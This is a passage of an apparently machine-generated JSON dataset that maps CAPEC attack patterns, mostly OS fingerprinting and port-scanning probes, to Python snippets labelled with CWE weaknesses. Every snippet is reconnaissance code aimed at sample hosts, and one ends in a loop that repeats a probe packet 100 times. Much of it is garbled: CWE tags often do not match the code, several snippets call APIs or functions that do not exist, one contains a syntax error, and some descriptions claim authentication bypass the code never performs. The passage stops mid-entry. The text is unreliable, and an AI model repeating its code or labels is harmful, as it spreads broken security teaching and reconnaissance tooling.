        "code_snippet": "import socket\nimport telnetlib\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\n# Scan for open ports on a target system\nport_scan_target = '192.168.1.100'\nopen_ports = []\nfor port in range(1, 1025):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((port_scan_target, port))\n        open_ports.append(port)\n        sock.close()\n    except socket.error:\n        pass\n\n# CWE-506: Embedded Malicious Code\n# CWE-319: Cleartext Transmission of Sensitive Information\n\n# Establish a Telnet connection to an open port\ntelnet_connection = telnetlib.Telnet(port_scan_target, 23)\nprint(telnet_connection.read_until(b\"login: \").decode())\n\n# CWE-1125: Excessive Attack Surface\n# Expose sensitive system information\nprint(f\"Open ports on {port_scan_target}: {open_ports}\")",
        "description": "Python code snippet that demonstrates a CAPEC-217 attack, where an attacker scans for vulnerable software versions or types, such as operating system versions or network services, and exploits them to gain unauthorized access. The code includes CWE-200, CWE-497, CWE-506, and CWE-1125 vulnerabilities."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "import socket\nimport os\nimport logging\n\n# CWE-592: Authentication Bypass Issues\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-589: Call to Non-ubiquitous API\n# CWE-534: Information Exposure Through Debug Log Files\n# CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n\ndef active_os_fingerprinting(ip_address):\n    try:\n        # Attempt to bypass authentication using CWE-592\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((ip_address, 80))\n        sock.send(b'GET / HTTP/1.1\\r\\nHost: ' + ip_address.encode() + b'\\r\\n\\r\\n')\n        response = sock.recv(1024)\n        # CWE-1316: Overlap protected and unprotected regions\n        if b'HTTP/1.1 200 OK' in response:\n            # CWE-589: Use non-ubiquitous API\n            os.system('uname -a')\n            # CWE-534: Log sensitive information\n            logging.debug('OS Fingerprinting successful')\n            # CWE-1191: Access internal registers and test modes\n            # This is a hypothetical example, as accessing internal registers and test modes is not possible in Python\n            # However, it demonstrates the concept of improper access control\n            return response.decode().split('\\n')[0]\n    except Exception as e:\n        logging.error('Error during OS Fingerprinting: ' + str(e))\n        return None\n\n# Example usage\nprint(active_os_fingerprinting('192.168.1.1'))",
        "description": "This Python code snippet demonstrates the deprecated CAPEC pattern of Active OS Fingerprinting, which involves identifying the operating system of a target machine. The code uses various CWEs to bypass authentication, overlap protected and unprotected regions, use non-ubiquitous APIs, log sensitive information, and access internal registers and test modes. Note that some CWEs are hypothetical and not directly applicable in Python."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "import socket\n\ndef os_fingerprinting(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Crafting a malformed TCP packet to elicit a unique response from the target OS\n    packet = bytearray([0x45, 0x00, 0x00, 0x3c, 0x11, 0x9c, 0x00, 0x00, 0x80, 0x02, 0x20, 0x00, 0x00, 0x00, 0x00, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37])\n    sock.sendto(packet, (ip, port))\n\n    # Capturing the response packet and analyzing it to determine the target OS\n    response = sock.recvfrom(1024)\n    response_packet = response[0]\n\n    # Extracting the IP ID field from the response packet, which can be used to fingerprint the OS\n    ip_id = response_packet[4:6]\n    os_type = determine_os_type(ip_id)\n    return os_type\n\n# Example usage\nip = '192.168.1.100'\nport = 80\nprint(os_fingerprinting(ip, port))",
        "description": "This Python code snippet demonstrates OS fingerprinting by sending a malformed TCP packet to a target IP and port, and then analyzing the response packet to determine the target OS. The code exploits CWE-200, CWE-497, CWE-207, CWE-319, and CWE-1323 by transmitting sensitive information in cleartext, exposing system-level information, and using observable behavioral discrepancies to identify the OS."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "import socket\nimport dpkt\nimport pcap\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1323: Improper Management of Sensitive Trace Data\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n\ndef os_fingerprint(pcap_file):\n    pc = pcap.pcap(pcap_file)\n    os_signatures = {\n        'Windows': b'\\x45\\x00\\x00\\x3c\\x11\\x9a\\x6a',\n        'Linux': b'\\x45\\x00\\x00\\x3c\\x11\\x9a\\x6b',\n        'MacOS': b'\\x45\\x00\\x00\\x3c\\x11\\x9a\\x6c'\n    }\n\n    for ts, pkt in pc:\n        eth = dpkt.ethernet.Ethernet(pkt)\n        ip = eth.data\n        if isinstance(ip, dpkt.ip.IP):\n            if ip.v == 4:\n                if ip.p == socket.IPPROTO_TCP:\n                    tcp = ip.data\n                    if tcp.sport == 80 or tcp.dport == 80:\n                        for os_sig in os_signatures.values():\n                            if os_sig in pkt:\n                                return list(os_signatures.keys())[list(os_signatures.values()).index(os_sig)]\n\n    return 'Unknown'\n\nprint(os_fingerprint('capture.pcap'))",
        "description": "This Python code snippet demonstrates a passive OS fingerprinting technique by analyzing network traffic captured in a pcap file. It uses the dpkt and pcap libraries to parse the packets and identify the operating system based on known signatures. The code is vulnerable to CWE-200, CWE-497, CWE-1323, CWE-319, and CWE-1249 as it exposes sensitive information, transmits it in cleartext, and does not properly manage sensitive system information."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport os\nimport logging\n\n# CWE-592: Authentication Bypass Issues\n# CWE-247: Reliance on DNS Lookups in a Security Decision\n# CWE-534: Information Exposure Through Debug Log Files\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-1323: Improper Management of Sensitive Trace Data\n\n# Active OS Fingerprinting (CAPEC-312)\ndef get_os_info(ip_address):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)\n        sock.connect((ip_address, 80))\n        os_info = sock.recv(1024)\n        logging.debug(os_info)  # CWE-534: Information Exposure Through Debug Log Files\n        return os_info\n    except Exception as e:\n        logging.error(str(e))\n\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-1323: Improper Management of Sensitive Trace Data\nfabric_address_map = {'protected_regions': ['0x1000', '0x2000'], 'unprotected_regions': ['0x3000', '0x4000']}\n\n# CWE-247: Reliance on DNS Lookups in a Security Decision\ndns_lookup = 'example.com'\n\n# CWE-592: Authentication Bypass Issues\nauth_bypass = True\n\nif auth_bypass:\n    os_info = get_os_info('192.168.1.1')\n    print(os_info)\n",
        "description": "This Python code snippet demonstrates the concept of Active OS Fingerprinting (CAPEC-312) by attempting to gather OS information from a target IP address. It also incorporates related CWEs, including CWE-592 (Authentication Bypass Issues), CWE-247 (Reliance on DNS Lookups in a Security Decision), CWE-534 (Information Exposure Through Debug Log Files), CWE-1316 (Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges), and CWE-1323 (Improper Management of Sensitive Trace Data)."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport os\nimport logging\n\n# CWE-294: Authentication Bypass by Capture-replay\ndef capture_replay_auth_bypass():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('target_server', 80))\n    request = b'GET / HTTP/1.1\\r\\nHost: target_server\\r\\n\\r\\n'\n    sock.send(request)\n    response = sock.recv(1024)\n    # Replay the response to bypass authentication\n    sock.send(response)\n\n# CWE-589: Call to Non-ubiquitous API\ndef non_ubiquitous_api():\n    try:\n        os.system('non_existent_command')\n    except Exception as e:\n        logging.debug('Error: ' + str(e))\n\n# CWE-534: Information Exposure Through Debug Log Files (Deprecated)\n# CWE-247: Reliance on DNS Lookups in a Security Decision (Deprecated)\ndef deprecated_functions():\n    logging.debug('This is a debug log message')\n    # DNS lookup example (CWE-247)\n    import dns.resolver\n    try:\n        dns.resolver.resolve('example.com', 'A')\n    except Exception as e:\n        logging.debug('Error: ' + str(e))\n\n# Active OS Fingerprinting (CAPEC-312)\ndef os_fingerprinting():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('target_server', 80))\n    request = b'GET / HTTP/1.1\\r\\nHost: target_server\\r\\n\\r\\n'\n    sock.send(request)\n    response = sock.recv(1024)\n    # Analyze the response to fingerprint the OS\n    print('OS Fingerprinting: ' + str(response))\n\nos_fingerprinting()\n",
        "description": "This Python code snippet demonstrates the CAPEC-312: Active OS Fingerprinting pattern, which involves analyzing network responses to identify the underlying operating system. The code includes examples of related CWEs, such as CWE-294: Authentication Bypass by Capture-replay, CWE-589: Call to Non-ubiquitous API, and deprecated CWEs like CWE-534 and CWE-247."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "import os\nimport socket\nimport logging\n\n# CWE-592: Authentication Bypass Issues (Deprecated)\n# CWE-534: Information Exposure Through Debug Log Files (Deprecated)\n\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\nfabric_address_map = {'protected_regions': [0x1000, 0x2000], 'unprotected_regions': [0x3000, 0x4000]}\n\n# CWE-1324: Sensitive Information Accessible by Physical Probing of JTAG Interface (Deprecated)\n# CWE-247: Reliance on DNS Lookups in a Security Decision (Deprecated)\n\n# Active OS Fingerprinting (CAPEC-312)\ndef get_os_info():\n    try:\n        os_info = os.sysctl('hw.machine')\n        return os_info\n    except Exception as e:\n        logging.debug(f'Error getting OS info: {e}')\n        return None\n\n# Perform DNS lookup (CWE-350)\ndef get_dns_info(host):\n    try:\n        dns_info = socket.gethostbyaddr(host)\n        return dns_info\n    except Exception as e:\n        logging.debug(f'Error getting DNS info: {e}')\n        return None\n\n# Main function\ndef main():\n    os_info = get_os_info()\n    dns_info = get_dns_info('example.com')\n    if os_info and dns_info:\n        print(f'OS Info: {os_info}, DNS Info: {dns_info}')\n    else:\n        print('Failed to gather OS or DNS information')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the concept of Active OS Fingerprinting (CAPEC-312) by attempting to gather OS information using the os module and DNS information using the socket module. The code also includes deprecated CWEs for context, such as CWE-592, CWE-534, CWE-1316, CWE-1324, and CWE-247. Note that these CWEs are deprecated and should not be used in production code."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import os\nimport socket\nimport icmp\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-291: Reliance on IP Address for Authentication\n\ndef get_os_info(ip_address):\n    seq_num = os.urandom(2)\n    icmp_packet = icmp.ICMP()\n    icmp_packet.icmp_type = 8\n    icmp_packet.icmp_code = 0\n    icmp_packet.icmp_cksum = 0\n    icmp_packet.icmp_id = seq_num\n    icmp_packet.icmp_seq = seq_num\n    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    raw_socket.sendto(icmp_packet, (ip_address, 0))\n    response = raw_socket.recvfrom(1024)\n    id_num = response[0][20:22]\n    return id_num\n\n# CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n# CWE-1294: Insecure Security Identifier Mechanism\n# CWE-605: Multiple Binds to the Same Port\n\ndef analyze_id_sequence(ip_address):\n    id_nums = []\n    for i in range(10):\n        id_nums.append(get_os_info(ip_address))\n    id_sequence = ''.join(id_nums)\n    if id_sequence == '':\n        return 'Unknown'\n    elif id_sequence == 'incr':\n        return 'Linux'\n    elif id_sequence == 'random':\n        return 'Windows'\n    else:\n        return 'Unknown'\n\nprint(analyze_id_sequence('192.168.1.1'))",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that analyzes the IP 'ID' field sequence number generation algorithm of a remote host. It sends an ICMP echo request packet to the target host and captures the response packet to extract the IP 'ID' number. The code then analyzes the sequence of IP 'ID' numbers to identify the operating system of the host. The code is vulnerable to CWE-200, CWE-291, CWE-1192, CWE-1294, and CWE-605."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import socket\nimport struct\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n# CWE-1290: Incorrect Decoding of Security Identifiers\n# CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n# CWE-1323: Improper Management of Sensitive Trace Data\n\ndef send_probe_packet(dst_ip, dst_port):\n    # Create a UDP socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n    # Set the IP ID field to an arbitrary value\n    ip_id = 0x1234\n    ip_hdr = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 0, ip_id, 0, 0, 0, 0, 0, 0, 0, 0)\n\n    # Send the probe packet to the destination\n    sock.sendto(ip_hdr, (dst_ip, dst_port))\n\n    # Receive the ICMP error message\n    icmp_pkt = sock.recv(1024)\n\n    # Extract the echoed IP ID field from the ICMP error message\n    echoed_ip_id = struct.unpack('!BBHHHBBH4s4s', icmp_pkt)[3]\n\n    # Check if the echoed IP ID field is reversed\n    if echoed_ip_id == ip_id ^ 0xFFFF:\n        print('OS fingerprinting successful!')\n    else:\n        print('OS fingerprinting failed!')\n\n# Example usage\nsend_probe_packet('192.168.1.1', 12345)",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that tests if the remote host echoes back the IP 'ID' value from the probe packet. The code creates a UDP socket, sets the IP ID field to an arbitrary value, sends the probe packet to the destination, receives the ICMP error message, and extracts the echoed IP ID field to determine if it is reversed, which can be used to identify the operating system or router firmware."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import os\nimport socket\nimport struct\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-1323: Improper Management of Sensitive Trace Data\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n\ndef send_udp_probe(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_DF, 1)\n    sock.sendto(b'', (ip, port))\n    response = sock.recvfrom(1024)\n    icmp_packet = response[0]\n    icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq = struct.unpack('!BBHHH', icmp_packet[:8])\n    if icmp_type == 3 and icmp_code == 3:\n        # Check if the DF bit is set in the response packet\n        if struct.unpack('!B', icmp_packet[36:37])[0] & 0x4000:\n            print(f'{ip} echoes back the IP DF bit')\n        else:\n            print(f'{ip} does not echo back the IP DF bit')\n\n# Example usage\nsend_udp_probe('192.168.1.1', 8080)",
        "description": "Python code snippet that sends a UDP probe to a remote host with the DF bit set to determine if the host echoes back the bit in the response packet, which can be used for OS fingerprinting."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import socket\nimport time\nimport json\n\n# Establish a connection to the target server\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('target_server_ip', 80))\n\n# Send a TCP SYN packet to initiate a connection\nsock.send(b\"\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x01\\x03\\x03\")\n\n# Receive the response from the server\nresponse = sock.recv(1024)\n\n# Extract the TCP timestamp from the response\ntcp_timestamp = response[8:12]\n\n# Calculate the timestamp difference\ntimestamp_diff = int.from_bytes(tcp_timestamp, 'big') - int(time.time() * 1000)\n\n# Analyze the timestamp difference to guess the operating system\nif timestamp_diff < 100:\n    os_guess = 'Windows'\nelif timestamp_diff < 1000:\n    os_guess = 'Linux'\nelse:\n    os_guess = 'Unknown'\n\n# Print the result in JSON format\nprint(json.dumps({'os_guess': os_guess}))",
        "description": "This code snippet demonstrates an OS fingerprinting probe that examines the remote server's implementation of TCP timestamps to guess the operating system of the target. It sends a TCP SYN packet to the target server, receives the response, extracts the TCP timestamp, and analyzes the timestamp difference to infer the operating system. This code embodies the CAPEC and CWEs by exposing sensitive information (CWE-200), bypassing authentication through capture-replay (CWE-294), using covert timing channels (CWE-385), observing timing discrepancies (CWE-208), and transmitting sensitive information in cleartext (CWE-319)."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import socket\nimport random\nimport time\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-1283: Mutable Attestation or Measurement Reporting Data\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG)\n\n# Create a socket object\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG)\nseed = int(time.time())\nrandom.seed(seed)\n\n# CWE-605: Multiple Binds to the Same Port\nport = 8080\nsock.bind((\"localhost\", port))\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# Send a probe packet to an open port on the target\nsock.connect((\"target_ip\", port))\nprobe_packet = \"Probe packet\"\nsock.send(probe_packet.encode())\n\n# Receive the response from the target\nresponse = sock.recv(1024)\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1283: Mutable Attestation or Measurement Reporting Data\n# Analyze the response to fingerprint the target OS\nack_num = int.from_bytes(response[0:4], byteorder='big')\nseq_num = int.from_bytes(response[4:8], byteorder='big')\n\nif seq_num == 0:\n    print(\"Target OS: Windows\")\nelif seq_num == ack_num:\n    print(\"Target OS: Linux\")\nelif seq_num == ack_num + 1:\n    print(\"Target OS: macOS\")\nelse:\n    print(\"Target OS: Unknown\")",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that tests the target system's assignment of TCP sequence numbers. It sends a probe packet to an open port on the target and analyzes the response to fingerprint the target OS. The code includes vulnerabilities related to CWE-200, CWE-605, CWE-1283, CWE-319, and CWE-337."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import socket\nimport json\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef get_os_info(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    syn_pkt = bytearray([0x12, 0x34, 0x56, 0x78])  # Sample SYN packet\n    sock.send(syn_pkt)\n    response = sock.recv(1024)\n    isn = int.from_bytes(response[4:8], 'big')  # Extract Initial Sequence Number\n    os_info = analyze_isn(isn)  # CWE-1323: Improper Management of Sensitive Trace Data\n    return os_info\n\n# CWE-1283: Mutable Attestation or Measurement Reporting Data\n# Sample analysis function (insecure implementation)\ndef analyze_isn(isn):\n    os_db = {'Linux': [1, 2, 4], 'Windows': [5, 6, 8]}\n    for os, seq_nums in os_db.items():\n        if isn in seq_nums:\n            return {'OS': os, 'Version': 'Unknown'}\n    return {'OS': 'Unknown', 'Version': 'Unknown'}\n\nif __name__ == '__main__':\n    ip = '192.168.1.100'\n    port = 80\n    os_info = get_os_info(ip, port)\n    print(json.dumps(os_info, indent=4))",
        "description": "Python code snippet demonstrating OS fingerprinting by analyzing Initial Sequence Numbers (ISNs) in TCP SYN/ACK response packets. The code sends a SYN packet to an open port, extracts the ISN, and compares it against a database of OS behaviors to determine the OS type and/or version. The code embodies CWE-200, CWE-319, CWE-497, CWE-1323, and CWE-1283 vulnerabilities."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "import time\nimport os\nimport socket\nimport threading\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition\n# CWE-385: Covert Timing Channel\n# CWE-1298: Hardware Logic Contains Race Conditions\n# CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\n\ndef get_os_sequence_numbers():\n    sequence_numbers = {}\n    for i in range(100):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('example.com', 80))\n        sequence_number = sock.getsockopt(socket.SOL_TCP, socket.TCP_SEQ)\n        sequence_numbers[time.time()] = sequence_number\n        time.sleep(0.1)\n        sock.close()\n    return sequence_numbers\n\ndef analyze_sequence_numbers(sequence_numbers):\n    os_rates = {}\n    for timestamp, sequence_number in sequence_numbers.items():\n        if timestamp not in os_rates:\n            os_rates[timestamp] = {}\n        os_rates[timestamp][sequence_number] = os_rates[timestamp].get(sequence_number, 0) + 1\n    return os_rates\n\ndef os_detection(os_rates):\n    os_database = {\n        'Windows': [100, 150, 200],\n        'Linux': [50, 100, 150],\n        'MacOS': [200, 250, 300]\n    }\n    for os, rates in os_rates.items():\n        for rate in rates.values():\n            if rate in os_database.values():\n                return os\n    return 'Unknown'\n\ndef main():\n    sequence_numbers = get_os_sequence_numbers()\n    os_rates = analyze_sequence_numbers(sequence_numbers)\n    detected_os = os_detection(os_rates)\n    print('Detected OS:', detected_os)\n\nif __name__ == '__main__':\n    threads = []\n    for i in range(10):\n        t = threading.Thread(target=main)\n        threads.append(t)\n        t.start()\n    for t in threads:\n        t.join()",
        "description": "This Python code snippet demonstrates an OS detection probe that measures the average rate of initial sequence number increments during a period of time. The code uses multiple threads to concurrently send TCP requests and collect sequence numbers, which are then analyzed to determine the likely operating system. The code embodies CWE-200, CWE-367, CWE-385, CWE-1298, and CWE-362 by exposing sensitive information, using a time-of-check time-of-use race condition, creating a covert timing channel, containing hardware logic race conditions, and executing concurrent code with improper synchronization."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import random\nimport time\nimport os\nimport socket\n\n# CWE-337: Predictable seed in PRNG\nseed = int(time.time())\nrandom.seed(seed)\n\n# CWE-341: Predictable from observable state\nsequence_numbers = [random.randint(0, 100) for _ in range(10)]\n\n# CWE-353: Missing support for integrity check\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('remote_host', 80))\nsock.sendall(str(sequence_numbers).encode())\n\n# CWE-200: Exposure of sensitive information\nresponse = sock.recv(1024).decode()\nprint(response)\n\n# CWE-211: Externally-generated error message containing sensitive information\ntry:\n    # Simulate an error\n    raise Exception('Error occurred while processing request')\nexcept Exception as e:\n    print(str(e))",
        "description": "This code snippet demonstrates a vulnerable sequence number generation algorithm that can be used to identify the operating system and version of a remote host. The algorithm uses a predictable seed for the pseudo-random number generator, and the generated sequence numbers are sent over the network without any integrity checks. The code also exposes sensitive information by printing error messages and responses from the remote host."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import socket\nimport struct\n\ndef send_ecn_probe(ip, port):\n    # CWE-319: Cleartext transmission of sensitive information\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ip, port))\n    \n    # CWE-353: Missing support for integrity check\n    packet = struct.pack('!BBHHH', 0x45, 0x00, 0x003c, 0x1234, 0x0000) + b'\\x00\\x00\\x00\\x00\\x11\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00\\x00\\x10\\x02\\x04\\x00' + b'\\x01\\x01\\x08\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    s.send(packet)\n    \n    # CWE-200: Exposure of sensitive information to an unauthorized actor\n    response = s.recv(1024)\n    if response:\n        # CWE-1320: Improper protection for outbound error messages and alert signals\n        if response[13] & 0x10:\n            print('ECN supported')\n        else:\n            print('ECN not supported')\n    else:\n        print('No response')\n    \n    # CWE-406: Insufficient control of network message volume (network amplification)\n    for _ in range(100):\n        s.send(packet)\n",
        "description": "Python code snippet that sends an ECN probe packet to a remote host to check if it supports ECN messaging. The code demonstrates CWE-319 by transmitting sensitive information in cleartext, CWE-353 by not verifying the integrity of the data, CWE-200 by exposing sensitive information, CWE-1320 by not properly handling error messages, and CWE-406 by not controlling the volume of network messages."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import socket\nimport struct\n\ndef get_initial_window_size(host, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    options = s.getsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG)\n    initial_window_size = struct.unpack('!I', options)[0]\n    return initial_window_size\n\ndef main():\n    host = 'example.com'\n    port = 80\n    window_size = get_initial_window_size(host, port)\n    print(f'Initial window size for {host}:{port} is {window_size}')\n    # Vulnerable code begins here\n    buffer = 'A' * window_size\n    s.send(buffer.encode())\n    # Stack-based buffer overflow (CWE-121)\n    # Buffer access using size of source buffer (CWE-806)\n    # Reliance on data/memory layout (CWE-188)\n    # Exposure of sensitive information to an unauthorized actor (CWE-200)\n    # Hardware allows activation of test or debug logic at runtime (CWE-1313)\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that checks the initial TCP Window size. It establishes a TCP connection, retrieves the initial window size, and then sends a buffer of that size to the server. The code includes vulnerabilities related to stack-based buffer overflows, buffer access using the size of the source buffer, reliance on data/memory layout, exposure of sensitive information, and hardware allowing activation of test or debug logic at runtime."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import socket\nimport struct\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-188: Reliance on Data/Memory Layout\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# CWE-605: Multiple Binds to the Same Port\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n\ndef get_tcp_options(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, 1)\n    tcp_options = bytearray([0x02, 0x04, 0x05, 0xb4])  # Reliance on Data/Memory Layout (CWE-188)\n    tcp_options.extend(bytearray([0x01, 0x01]))  # Multiple Binds to the Same Port (CWE-605)\n    tcp_options.extend(bytearray([0x07, 0x10, 0x1f, 0x10]))  # Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges (CWE-1316)\n    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_OPTIONS, bytes(tcp_options))\n    response = sock.recv(1024)\n    sock.close()\n    return response\n\n# OS Fingerprinting Probe\nip = '192.168.1.1'\nport = 80\nresponse = get_tcp_options(ip, port)\n\nif response:\n    print('OS Fingerprinting Probe Response: ', response)\nelse:\n    print('No response received')",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that analyzes the type and order of TCP header options present in a response segment. It relies on the assumption that different operating systems use unique ordering and different option sets when options are present, as specified in RFC 793. The code sets custom TCP options using the setsockopt function, which can be used to bypass access control and leak sensitive data. The response from the target system is then analyzed to determine the OS fingerprint."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-294: Authentication Bypass by Capture-replay\n\ndef send_rst_packet(ip, port, message):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    sock.send(b\"\"\" + message.encode() + b\"\\r\\n\\r\\n\")\n    sock.close()\n\n# CWE-353: Missing Support for Integrity Check\n# CWE-354: Improper Validation of Integrity Check Value\n\ndef get_checksum(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Example usage:\nip = \"192.168.1.1\"\nport = 80\nmessage = \"This is a test message\"\n\nsend_rst_packet(ip, port, message)\nchecksum = get_checksum(message)\nprint(f\"Checksum: {checksum}\")",
        "description": "This Python code snippet demonstrates an OS fingerprinting probe that sends a RST packet with a custom message to a target IP and port. The message is sent in cleartext, allowing an unauthorized actor to capture and replay it. The code also calculates an MD5 checksum of the message, but does not validate it, making it vulnerable to integrity check issues."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
